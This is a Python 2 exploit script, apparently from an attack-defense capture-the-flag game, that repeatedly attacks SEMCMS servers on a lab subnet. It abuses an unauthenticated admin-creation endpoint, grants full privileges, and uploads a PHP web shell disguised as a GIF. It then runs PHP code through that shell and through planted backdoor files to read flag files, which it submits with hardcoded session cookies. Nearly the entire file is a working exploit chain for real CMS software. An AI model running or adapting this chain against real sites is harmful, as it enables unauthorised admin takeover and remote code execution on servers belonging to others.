from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from requests import *

import os, sys, time
import urllib
import urllib2
import hashlib
register_openers()
total_flag = []


def auth(flag):
	csrf = "lXFIiVyHYW679znO1o64oI7KVbK02Hf0"
	session = "hplqf6ux5gdnodwzf4wdvsltg58fkzkp"
	r = post("http://192.168.199.200//submit_flag/defense", data={"flag" : flag}, cookies={"csrftoken": csrf, "sessionid": session})
	return repr(r.content)

while True:
	for _addr in range(201,211):
		if _addr == 6: # our IP
			continue

		# test connection
		print(". 192.168.199.%s" % (_addr, ))
		addr = "http://192.168.199.%s/" % (_addr,)
		try:
			data = urllib2.urlopen(addr, timeout=2).read()
		except:
			print(" \_ server down.")
			continue
		if '<meta name="viewport" content="width=device-width, initial-scale=1.0">' not in data:
			print(" \_ server down.")
			continue
		# 1. try logic on admin (leak admin credentials)
		print(" \_ adding admin..")
		payload = urllib.urlencode({"user_name": "hello", "user_admin": "world", "user_ps": "world", "user_tel": "333", "user_email": "hello@world.com"})
		request = urllib2.Request(addr + "/Admin/SEMCMS_Top_include.php?CF=user&Class=add")
		#request.add_header("Cookie", "scusername=semcms; scuser=\\; scuserqx=||1=1;")

		try:
			result = urllib2.urlopen(request, payload).read()
			alive = True
		except:
			print("  \_ connection error!")
			continue
		if alive:
			if "SC_Page_Config/Image/icons/tick.png" in result:
				# set user_qx => 74,76,77,87,88,75,78,79,80,81,82,83,84,89,en
				payload = {"uid": "ID"}
				_p = "74,76,77,87,88,75,78,79,80,81,82,83,84,89,en".split(",")
				for i in range(len(_p)):
					payload["ID[" + str(i) + "]"] = _p[i]
				payload = urllib.urlencode(payload)
				request = urllib2.Request(addr + "/Admin/SEMCMS_Top_include.php?CF=fenpei")

				try:
					result = urllib2.urlopen(request, payload).read()
				except:
					print("  \_ connection error!")
				# 80,88,en,75,82,76,83,78,89,79,77,81,87,84,74
				if "SC_Page_Config/Image/icons/tick.png" in result:
					print("  \_ admin generated! :)")
				else:
					print("  \_ oops.. token generation failed..")
			else:
				print("  \_ oops.. id generation failed..")


		# 2. upload shell.. (on admin)
		print(" \_ uploading admin shell ..")
		fail = False
		with open("web.php.gif", 'r') as _f:
			datagen, headers = multipart_encode({"file": _f, "imageurl":'.', "filed": '', "filedname": '', "wname": "ppp"})
			request = urllib2.Request(addr + "/Admin/SEMCMS_Upfile.php", datagen, headers)
			_hash = hashlib.md5("world").hexdigest()
			request.add_header("Cookie", "scusername=hello; scuser="+_hash+"; scuserqx=80,88,en,75,82,76,83,78,89,79,77,81,87,84,74")
			try:
				result = urllib2.urlopen(request, timeout=2).read()
			except:
				print(" \_ connection error!")
				fail = True
			if not fail:
				try:
					result = result.split("<body>")[1]
					_r = result.split("value='")[1].split("'")[0]
				except:
					_r = result

				if _r.endswith(".php"): #if pwned?
					payload = urllib.urlencode({"c": "echo file_get_contents('/home/user1/flag'); exit();"})
					try:
						flag = urllib2.urlopen(addr + "/Admin/" + _r, payload).read().split("=")[-1].split("\n")[0]
						if len(flag) == 32 and flag not in total_flag:
							print("    \_ possible flag: %s" % (flag, ))
							total_flag.append(flag)
							print(auth(flag))
						else:
							flag = urllib2.urlopen(addr + "/Admin/.kk.php", payload).read().split("=")[-1].split("\n")[0]
							if len(flag) == 32 and flag not in total_flag:
								print("    \_ possible flag: %s" % (flag, ))
								total_flag.append(flag)
								print(auth(flag))
							else:
								flag = urllib2.urlopen(addr + "/Admin/.stypr.php", payload).read().split("=")[-1].split("\n")[0]
								if len(flag) == 32 and flag not in total_flag:
									print("    \_ possible flag: %s" % (flag, ))
									total_flag.append(flag)
									print(auth(flag))
								else:
									print("    \_ flag not found")
					except:
						try:
							flag = urllib2.urlopen(addr + "/Admin/.kk.php", payload).read().split("=")[-1].split("\n")[0]
							if len(flag) == 32 and flag not in total_flag:
								print("    \_ possible flag: %s" % (flag, ))
								total_flag.append(flag)
								print(auth(flag))
						except:
							try:
								flag = urllib2.urlopen(addr + "/Admin/.stypr.php", payload).read().split("=")[-1].split("\n")[0]
								if len(flag) == 32 and flag not in total_flag:
									print("    \_ possible flag: %s" % (flag, ))
									total_flag.append(flag)
									print(auth(flag))
							except:
								print("    \_ flag not found")
			else:

				try:
					flag = urllib2.urlopen(addr + "/Admin/.kk.php", payload).read().split("=")[-1].split("\n")[0]
					if len(flag) == 32 and flag not in total_flag:
						total_flag.append(flag)
						print("    \_ possible flag: %s" % (flag, ))
						print(auth(flag))
				except:
					try:
						flag = urllib2.urlopen(addr + "/Admin/.stypr.php", payload).read().split("=")[-1].split("\n")[0]
						if len(flag) == 32 and flag not in total_flag:
							total_flag.append(flag)
							print("    \_ possible flag: %s" % (flag, ))
							print(auth(flag))
					except:
						print("    \_ flag not found")
		continue

	#print("--> ", total_flag)
	time.sleep(20)


